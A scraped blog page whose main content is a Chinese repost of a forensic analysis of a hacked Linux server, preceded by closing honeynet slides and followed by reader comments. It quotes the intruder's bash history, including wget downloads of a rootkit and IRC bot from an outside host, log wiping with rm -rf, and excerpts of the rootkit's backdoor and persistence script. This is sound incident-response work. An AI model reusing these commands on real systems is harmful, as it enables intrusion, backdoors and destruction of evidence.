<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> iptables 配置与连接效果
第 25页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> SnortSam 可以调整的部份
第 26页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 对攻击报文的分析
• Sebek
第 27页
<img src="" alt=""> <img src="" alt=""> 总结
• 企业秘密保护的要求 • 陷阱网络对企业秘密保护的意义
–实现“内容级”的 Honeypot –隐藏真实目标 –及时发现和处理小规模恶意事件 –攻击者分类及分别对待（试探、违规、攻击、渗透）
• 自防御型陷阱网络的构成
第 28页
<img src="" alt=""> <img src="" alt=""> 展望
• 对自防御型 NAT 陷阱的完善
–融合、统一控制及数据分析 –roo CDROM [Honeynet project]
• 其它类型陷阱网络
–客户端陷阱（针对内网用户的客户端攻击） –帐号口令陷阱（针对网络钓鱼）
第 29页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 关于大成天下 (<a href="http://www.unnoo.com" target="_blank">http://www.unnoo.com</a>)
我们的技术专长
渗透测试（ Penetration testing ） 网络架构评估设计（ Architecture review and design ） 应用审计（ Application audit ） 源代码审计（ Source code review ） 黑箱测试（ Online or Binary Black box testing ） 审计、追踪与数据恢复（ Forensics ） 协议分析（ Protocol analysis ）
我们的产品
游刃基线安全系统 铁卷信息监控平台
我们的服务
网络安全评估 网络安全培训 信息安全监理 软件定制开发
第 30页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 谢谢！</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--企业秘密保护与陷阱网络10/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--企业秘密保护与陷阱网络10" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">一次服务器被入侵后的分析</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-">一次服务器被入侵后的分析</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<ul>
<li><a href="http://www.freebuf.com/" target="_blank">首页</a></li>
<li><a href="http://www.freebuf.com/category/news" target="_blank">资讯</a></li>
<li><a href="http://www.freebuf.com/category/tools" target="_blank">工具</a></li>
<li><p><a href="http://www.freebuf.com/category/articles" target="_blank">文章</a></p>
</li>
<li><p><a href="http://www.freebuf.com/category/articles/web" target="_blank">WEB安全</a></p>
</li>
<li><a href="http://www.freebuf.com/category/articles/wireless" target="_blank">无线安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/system" target="_blank">系统安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/database" target="_blank">数据库安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/terminal" target="_blank">终端安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/others-articles" target="_blank">其他</a></li>
<li><a href="http://www.freebuf.com/category/video" target="_blank">视频</a></li>
<li><a href="http://www.freebuf.com/category/jobs" target="_blank">招聘</a></li>
<li><a href="http://www.freebuf.com/category/geek" target="_blank">极客</a></li>
<li><a href="http://www.freebuf.com/bufer" target="_blank">达人</a></li>
<li><a href="http://www.freebuf.com/newsend" target="_blank">投稿</a></li>
</ul>
<p><a href="http://www.freebuf.com/wp-login.php?redirect_to=http://www.freebuf.com" title="登陆" target="_blank">登陆</a><a href="http://www.freebuf.com/wp-login.php?action=register" target="_blank">注册</a></p>
<p><a href="http://www.freebuf.com/" target="_blank"><img src="" alt="freebuf"></a></p>
<p><a href="http://www.weibo.com/freebuf" title="收听新浪微博" target="_blank">新浪微博</a> <a href="http://t.qq.com/freebuf" title="收听腾讯微博" target="_blank">腾讯微博</a><a href="http://www.freebuf.com/feed" title="订阅我们" target="_blank">订阅我们</a></p>
<h3 id="-">一次服务器被入侵后的分析</h3>
<p><a href=""></a><a href="http://www.freebuf.com/author/litdg" title="由 litdg 发布">litdg</a> @ <a href="http://www.freebuf.com/category/articles/system" title="查看 系统安全 中的全部文章" target="_blank">系统安全</a> 2013-09-11 共 <strong>9902</strong> 人围观 </p>
<p><strong>最近有个朋友让我去帮他看一下他的linux服务器.说是apache启动不了,有很多诡异的情况.后来证明绝不是apache启动不了这么简单.</strong></p>
<p>登上服务器之后随便看了下,最先引起我注意的是”ls”命令的输出:</p>
<p>lars@server1:~$ ls ls: invalid option -- h Try `ls --help&#39; for more information.</p>
<p>为什么”ls”默认加了”-h”参数呢?我用”alias”命令看了一下,然后取消了这个别名之后”ls”就工作正常了.</p>
<p>lars@server1:~$ alias ls alias ls=&#39;ls -sh --color=auto&#39; lars@server1:~$ unalias ls lars@server1:~$ ls backup lars@server1:~$</p>
<p>虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题.</p>
<p>lars@server1:~$ sudo /etc/init.d/apache2 start Password: /* Starting apache 2.0 web server... (2): apache2: could not open error log file /var/log/apache2/error.log. Unable to open logs ...fail!</p>
<p>纳尼?赶紧去”/var/log/”目录一看,果然”apache2/”文件夹不见了.而且这个目录下其他的文件夹,比如”mysql/”,”samba/”也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题.</p>
<p>lars@server1:~$ sudo -i Password: root@server1:~/# ls ls: unrecognized prefix: do ls: unparsable value for LS_COLORS environment variable total 44 4 . 4 .bashrc 4 .ssh 4 .. 4 .lesshst 8 .viminfo 8 .bash_history 4 .profile 4 .vimrc</p>
<p>很不幸的发现,”ls”又出问题了.同样,用”alias”命令:</p>
<p>root@server1:~/# alias ls alias ls=&#39;ls -sa --color=auto&#39; root@server1:~/# unalias ls root@server1:~/# ls root@server1:~/#</p>
<p>这个时候,我才意识到问题的严重性.”ls”奇怪的举动和”/var/log/”大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的”.bash_history”时,就已经可以确定被入侵了.</p>
<p>root@server1:~/# cat -n .bash_history ... 340 w 341 cd /var 342 wget <a href="http://83.19.148.250/~matys/pliki/shv5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/shv5.tar.gz</a> 343 tar -zxf shv5.tar.gz 344 rm -rf shv5.tar.gz 345 mv shv5 .x 346 cd .x 347 ./setup zibi.joe.149 54098 348 passwd 349 passwd 350 ps aux 351 crontab -l 352 cat /etc/issue 353 cat /etc/passwd 354 w 355 who 356 cd /usr/lib/libsh 357 ls 358 hide + 359 chmod +x hide 360 hide + 361 ./hide + 362 cd /var/.x 363 mkdir psotnic 364 cd psotnic 365 wget <a href="http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz</a> 366 tar -zxf psotnic0.2.5.tar.gz 367 rm -rf psotnic0.2.5.tar.gz 368 ls 369 mv psotnic-0.2.5-linux-static-ipv6 synscan 370 ./synscan 371 vi conf 372 vi conf1 373 mv synscan smbd 374 smbd -c conf 375 ls 376 ps aux 377 ls 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1 383 rm -rf conf.dec 384 rm -rf conf1.dec 385 cd /usr/lib/libsh 386 ./hide + 387 exit ... 425 ssh ftp@62.101.251.166 426 w 427 ls 428 ls 429 cd /var/.x 430 ls 431 cd psotnic/ 432 ls 433 rm -rf /var/log//* 434 exit 435 ls 436 cd /var/.x/psotnic/ 437 ls 438 vi conf2 439 ./smbd -c conf2 440 ./smbd conf2 441 ./smbd -a conf conf1 conf2 442 rm -rf conf2.dec 443 cd .. 444 ls 445 cd /usr/lib/libsh 446 hide + 447 ./hide + 448 exit 449 ps aux 450 cd /var/.x 451 ls 452 ls 453 cd psotnic/ 454 ls 455 cat pid.MastaH 456 kill -9 2030 457 ./synscan -a conf conf1 458 ./smbd -a conf conf1 459 cd /usr/lib/libsh 460 ./hide +</p>
<p>Woht!这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除”.bash_history”文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵.</p>
<p>通过bash history我们得到了大量的信息.先来看一下”/var/.x”下面隐藏了什么和命令”setup zibi.joe.149 54098″的作用吧.</p>
<p>root@server1:/var/.x/# file setup setup: Bourne-Again shell script text executable root@server1:/var/.x/# wc -l setup 825 setup root@server1:/var/.x/# head -17 setup /#!/bin/bash /# /# shv5-internal-release /# by: PinT[x] April/2003 /# /# greetz to: /# /# [/<em>] SH-members: BeSo_M, grass^, toolman, nobody, niceboy, armando99 /# C00L|0, GolDenLord, Spike, zion ... /# [/</em>] Alba-Hack : 2Cool, heka, TheMind, ex-THG members ... /# [/<em>] SH-friends: mave, AlexTG, Cat|x, klex, JinkS ... /# [/</em>] tC-members: eksol, termid, hex, keyhook, maher, tripod etc.. /# [/<em>] And all others who diserve to be here but i forgot /# [/</em>] them at the moment ! /# /# PRIVATE ! DO NOT DISTRIBUTE /<em>censored/</em>EZ !</p>
<p>“setup”这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门–”/bin/ttyload”,然后把它加到了”/etc/inittab”,这样每次重启后就会自动启动.(相关部分的脚本如下:)</p>
<p>mv $SSHDIR/sshd /sbin/ttyload chmod a+xr /sbin/ttyload chmod o-w /sbin/ttyload touch -acmr /bin/ls /sbin/ttyload chattr +isa /sbin/ttyload kill -9 <code>pidof ttyload</code> &gt;/dev/null 2&gt;&amp;1 .... /# INITTAB SHUFFLING chattr -isa /etc/inittab cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1 cat /etc/inittab |grep getty &gt; /tmp/.init2 echo &quot;/# Loading standard ttys&quot; &gt;&gt; /tmp/.init1 echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p>
<p>它也替换了一些linux的标准命令.</p>
<p>/# Backdoor ps/top/du/ls/netstat/etc.. cd $BASEDIR/bin BACKUP=/usr/lib/libsh/.backup mkdir $BACKUP ... /# ls ... chattr -isa /bin/ls cp /bin/ls $BACKUP mv -f ls /bin/ls chattr +isa /bin/ls</p>
<p>这样子就可以解释为什么”ls”命令输出那么奇怪了.</p>
<p>“.backup”文件夹保存了被替换之前的命令程序.</p>
<p>root@server1:/var/.x/# ls -l /usr/lib/libsh/.backup/ total 552 -rwxr-xr-x 1 root root 126276 Dec 24 22:58 find -rwxr-xr-x 1 root root 59012 Dec 24 22:58 ifconfig -rwxr-xr-x 1 root root 77832 Dec 24 22:58 ls -rwxr-xr-x 1 root root 30388 Dec 24 22:58 md5sum -rwxr-xr-x 1 root root 99456 Dec 24 22:58 netstat -rwxr-xr-x 1 root root 65492 Dec 24 22:58 ps -rwxr-xr-x 1 root root 14016 Dec 24 22:58 pstree -rwxr-xr-x 1 root root 50180 Dec 24 22:58 top</p>
<p>看了一下时间戳,居然是在圣诞节.</p>
<p>很显然,原始的”ls”和后门安装的”ls”是不一样的.他们的md5对比如下:
root@server1:~/# md5sum /usr/lib/libsh/.backup/ls /bin/ls eef7ca9dd6be1cc53bac84012f8d1675 /usr/lib/libsh/.backup/ls 0a07cf554c1a74ad974416f60916b78d /bin/ls root@server1:~/# file /bin/ls /bin/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, dynamically linked (uses shared libs), for GNU/Linux 2.0.0, stripped root@server1:~/# file /usr/lib/libsh/.backup/ls /usr/lib/libsh/.backup/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.0, dynamically linked (uses shared libs), for GNU/Linux 2.6.0, stripped</p>
<p>这个rootkit(“sh5.tar.gz”)是从下面的地址下载的.</p>
<p>root@server1:~/# dig +short -x 83.19.148.250 4lo.bydg.pl.</p>
<p>这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.</p>
<p>这是运行”setup”命令的截图:(在服务器上的沙盒里运行的)</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030843_30626.jpg" alt=""></p>
<p>所以”zibi.joe.149″是后门的密码,”54098″是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030856_44197.jpg" alt=""></p>
<p>安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员.”psotnic0.2.5.tar.gz”就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为”smbd”,来达到隐藏的目的.</p>
<p>然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了.</p>
<p>371 vi conf 372 vi conf1 .... 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1</p>
<p>让我们执行一下382这条命令,看看会发生什么.
root@server1:/var/.x/psotnic/# ./smbd -a conf conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [+] Adding: /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 [+] Adding: /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1 [+] Added 2 psotnics to cron</p>
<p>哇!它添加了cron定时任务.赶紧看一看:</p>
<p>root@server1:/var/.x/psotnic/# crontab -l /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1</p>
<p>接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程:
root@server1:~/# cd /var/.x/psotnic; ./smbd conf Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/<em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5724] root@server1:/var/.x/psotnic/# ./smbd conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/</em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5727] root@server1:/var/.x/psotnic/#</p>
<p>用”ps”命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程.</p>
<p>root@server1:/var/.x/psotnic/# ps axuw | grep smb root 3799 0.0 0.4 8592 2156 ? S 11:00 0:00 /usr/sbin/smbd -D root 3808 0.0 0.1 8592 896 ? S 11:00 0:00 /usr/sbin/smbd -D root 5724 0.0 0.1 1648 772 pts/2 S 12:47 0:00 ./smbd conf root 5727 0.0 0.1 1640 764 pts/2 S 12:47 0:00 ./smbd conf1</p>
<p>最开始两个是真正的samba进程,后面两个是irc-bot,让我们用”strace”命令来看看它做了什么:
root@server1:~/# strace -p 5727 ... connect(3, {sa_family=AF_INET, sin_port=htons(9714), sin_addr=inet_addr(&quot;83.18.74.235&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress) ... connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr(&quot;195.159.0.92&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress)</p>
<p>可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口:</p>
<p>root@server1:~/# dig +short -x 83.18.74.235 manhattan.na.pl. root@server1:~/# dig +short -x 195.159.0.92 ircnet.irc.powertech.no.</p>
<p>又是一个波兰的ip.另外一个ip,”ircnet.irc.powertech.no”是”irc.powertech.nof”的别名.是挪威一个著名的irc服务器.</p>
<p>tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了”irc.powertech.no”,加入了”/#aik”频道.
:irc.powertech.no 001 578PAB9NB :Welcome to the Internet Relay Network 578PAB9NB!~op@ti231210a080-3666.bb.online.no :irc.powertech.no 002 578PAB9NB :Your host is irc.powertech.no, running version 2.11.1p1 :578PAB9NB!~op@ti231210a080-3666.bb.online.no JOIN :/#aik :irc.powertech.no 353 578PAB9NB @ /#aik :578PAB9NB kknd raider brandyz jpi conf xerkoz IpaL vvo :irc.powertech.no 366 578PAB9NB /#aik :End of NAMES list. :irc.powertech.no 352 578PAB9NB /#aik ~op ti231210a080-3666.bb.online.no irc.powertech.no 578PAB9NB G :0 op - GTW :irc.powertech.no 352 578PAB9NB /#aik ~kknd ti231210a080-3666.bb.online.no irc.hitos.no kknd H :2 kknd - GTW :irc.powertech.no 352 578PAB9NB /#aik ~raider mobitech-70.max-bc.spb.ru /<em>.dotsrc.org raider G :4 raider - GTW :irc.powertech.no 352 578PAB9NB /#aik ~brandyz mobitech-70.max-bc.spb.ru /</em>.dotsrc.org brandyz G :4 brandyz - GTW :irc.powertech.no 352 578PAB9NB /#aik ~jpi p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp jpi G :8 jpi - GTW :irc.powertech.no 352 578PAB9NB /#aik ~conf p3124-ipad309sasajima.aichi.ocn.ne.jp /</em>.jp conf G :7 conf - GTW :irc.powertech.no 352 578PAB9NB /#aik ~xerkoz p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp xerkoz H :7 xerkoz - GTW :irc.powertech.no 352 578PAB9NB /#aik lm campus19.panorama.sth.ac.at /</em>.at IpaL H :5 .LaPi.9@.IRCNet.. :irc.powertech.no 352 578PAB9NB /#aik ~vvo ppp86-7.intelcom.sm /*.tiscali.it vvo H :6 vvo - GTW :irc.powertech.no 315 578PAB9NB /#aik :End of WHO list. 这些仅仅是加入/#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了. 17:43 -!- viper42 [~viper42@trinity.gnist.org] has joined /#aik 17:43 [Users /#aik] 17:43 [ 578PAB9NL] [ conf] [ jpi ] [ raider ] [ vvo ] 17:43 [ brandyz ] [ IpaL] [ kknd] [ viper42] [ xerkoz] 17:43 -!- Irssi: /#aik: Total of 10 nicks [0 ops, 0 halfops, 0 voices, 10 normal] 17:43 -!- Irssi: Join to /#aik was synced in 1 secs</p>
<p>我发现我朋友的服务器使用的昵称是”578PQB9NB”,还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀”\/*-GTW”,只有一个没有:</p>
<p>17:45 [powertech] -!- IpaL [lm@campus19.panorama.sth.ac.at] 17:45 [powertech] -!- ircname : LaPi@IRCNet 17:45 [powertech] -!- channels : /#relaks /#ping @/#seks /#aik @/#ogame.pl /#pingwinaria /#hattrick /#trade /#admin @/#!sh 17:45 [powertech] -!- server : /*.at [\o\ \o/ /o/]</p>
<p>这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了:</p>
<p>$ dig +short campus19.panorama.sth.ac.at 193.170.51.84</p>
<p>根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:
From: Alexander Talos via RT To: larstra@ifi.uio.no Subject: Cracker at campus19.panorama.sth.ac.at (193.170.51.84) [ACOnet CERT /#38603] Date: Fri, 18 May 2007 18:22:43 +0200 (CEST) Reply-To: cert@aco.net -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1 Hej! On Fri May 18 14:45:03 2007, larstra@ifi.uio.no wrote: &gt; I have been tracking down cracker which connected from &gt; campus19.panorama.sth.ac.at (193.170.51.84). The user, which Ouch. panorama.sth.ac.at is a dormitory with about 4k rooms all behind a NAT gateway - it will be very hard to get hold of the miscreant. This incident will, in the long run, definitely help me getting rid of the NAT boxes in setups like that, but right now, we will have to make do with what we have. &gt; Please investigate the host in question. Perhaps is this a &gt; compromised host on your network acting as a jumpstation for Sure, and even in a NATed environment, this is still possible. Btw, you did a great job in analysing the compromised machine! I&#39;ll let you know when I have either further questions or any interesting results. Cheers, Alexander Talos - -- IT-Security, Universitaet Wien, ACOnet CERT T: +43-1-4277-14351 M: +43-664-60277-14351</p>
<p>看起来我不够幸运.</p>
<p>接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口.</p>
<p>连接到”83.18.74.235″的流量看起来很混乱.只好再次用strace命令:</p>
<p>root@server1:/var/.x/psotnic/# strace -f ./smbd conf1 &amp;&gt; /root/dump.strace</p>
<p>跟预期的一样,有很多输出,其中一个是它尝试启动”BitchX”,这是一个irc客户端.但是失败了,因为BitchX没有安装:</p>
<p>[pid 7537] write(2, &quot;sh: &quot;, 4) = 4 [pid 7537] write(2, &quot;BitchX: not found&quot;, 17) = 17 [pid 7537] write(2, &quot;n&quot;, 1) = 1 [pid 7537] close(2) = 0</p>
<p>下面的截图是tcpdump抓到流量的一部分:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130911/20130911000637_34187.jpg" alt=""></p>
<p>这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是”irc.hitos.no”,位于挪威的特罗姆斯郡.</p>
<p>入侵者除了这些,还运行了一个叫”hide”的脚本来清除日志:
root@server1:/usr/lib/libsh/# ./hide + Linux Hider v2.0 by mave enhanced by me! [+] [Shkupi Logcleaner] Removing + from the logs........ . [+] /var/log/messages ... [done] [+] /var/run/utmp ... [done] [+] /var/log/lastlog ... [done] [+] /var/log/wtmp ... [done] /<em> m i s s i o n a c c o m p l i s h e d /</em> p.h.e.e.r S.H.c.r.e.w</p>
<p>那么这个入侵者为什么还要把”/var/log/”目录全删除了呢,是不相信这个工具么?还是他特别害怕?</p>
<p>可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到:</p>
<p>1, 忘记清除”.bash_history”文件</p>
<p>2, “/var/log”目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.</p>
<p>3, 修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.</p>
<p>4, irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.</p>
<p>5, 入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.</p>
<p>当然还有几个遗留的问题:</p>
<p>1,”ssh ftp@62.101.251.166″ 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?</p>
<p>$ dig +short -x 62.101.251.166 cA6FB653E.dhcp.bluecom.no.</p>
<p>2,跟83.18.74.235(manhattan.na.pl)的通讯内容是什么?</p>
<p>3,最重要的问题是他一开始是如何或得下系统的权限的?这个服务器运行的是Ubuntu 6.06 LTS,打了最新的补丁.可能入侵的途径:</p>
<p>/<em>猜测root密码,不幸的是这个密码是强密码/</em></p>
<p>/<em>未知的exploit/</em></p>
<p>/<em>某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码./</em></p>
<p><a href="http://blog.larsstrand.no/2007/04/holiday-cracking.html" target="_blank">原文地址</a>
9 1 您已评价！</p>
<h3 id="-freebuf-com-http-www-freebuf-com-"><img src="" alt=""> <strong>如文中未特别声明转载请注明出自:</strong> <a href="http://www.freebuf.com/" target="_blank">FreebuF.COM</a></h3>
<p><img src="" alt=""> <a href="&quot;累计分享3次&quot;">3</a>
<img src="&quot;Favorite&quot;" alt="Favorite"><img src="&quot;Loading&quot;" alt="Loading"><a href="http://www.freebuf.com/articles/system/?wpfpaction=add&amp;postid=12443" title="收藏该文" target="_blank">收藏该文</a></p>
<h3 id="-">相关文章</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12696.html" target="_blank">Dionaea低交互式蜜罐部署详解</a></li>
</ul>
<p><strong>4</strong>条评论 <strong>3638</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12443.html" target="_blank">一次服务器被入侵后的分析</a></li>
</ul>
<p><strong>24</strong>条评论 <strong>9904</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank">Socks代理反弹突破内网</a></li>
</ul>
<p><strong>15</strong>条评论 <strong>6114</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12140.html" target="_blank">如何导出Windows哈希系列二</a></li>
</ul>
<p><strong>7</strong>条评论 <strong>3940</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12104.html" target="_blank">浅谈企业运维安全</a></li>
</ul>
<p><strong>21</strong>条评论 <strong>6140</strong>人已围观
﻿</p>
<h2 id="24-comments-">24 Comments <a href="">发表评论</a></h2>
<ol>
<li><a href="http://www.freebuf.com/?author=3022" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/园长MM" target="_blank">园长MM </a> (1级)  <a href=""></a> 2013-09-11    1楼</li>
</ol>
<p>路过
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15570#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=1804" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/whitemonty" target="_blank">whitemonty </a> (1级)  <a href=""></a> 2013-09-11    2楼</li>
</ol>
<p>欢迎收看黑客追踪第一季
<a href="">亮了</a>(5)
<a href="http://www.freebuf.com/articles/system/?replytocom=15572#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11    3楼</li>
</ol>
<p>一个普通的web蠕虫+IRC木马 而已。
据老衲的经验 十之八九 是 IRC木马 自动攻击了你朋友的web服务器，通过蠕虫的web漏洞攻击插件，获得了权限，提权，下载安装木马，然后你朋友服务器就成了这僵尸网络中一个普普通通的 肉鸡。</p>
<p>文中提及的诸多入侵者的纰漏都是因为 自动脚本完成的，所以没那么精致。
<a href="">亮了</a>(10)
<a href="http://www.freebuf.com/articles/system/?replytocom=15575#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 虽然没看懂。但是感觉很高端的样子
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15576#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11</li>
</ul>
<p>@litdg  <img src="http://static.freebuf.com/uploads/image/20130911/20130911000441_59774.jpg" alt="">
<a href="">亮了</a>(6)
<a href="http://www.freebuf.com/articles/system/?replytocom=15578#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 baidu又搞防外链…
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15580#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 长见识了啊。不知道能否约个稿，在fb写文介绍一下相关技术。
<a href="">亮了</a>(6)
<a href="http://www.freebuf.com/articles/system/?replytocom=15590#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> Helen <a href=""></a> 2013-09-11    4楼</li>
</ul>
<p>我国外的小弟做的
<a href="">亮了</a>(7)
<a href="http://www.freebuf.com/articles/system/?replytocom=15577#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=524" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/softbug" target="_blank">softbug </a> (4级) 用软件解放大家的双手，希望大家都可以使用自己开发的软件。 <a href=""></a> 2013-09-11    5楼</li>
</ul>
<p>好久没看到过入侵分析的文章了。而且是真实案例
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15581#respond" target="_blank">回复</a></p>
<ul>
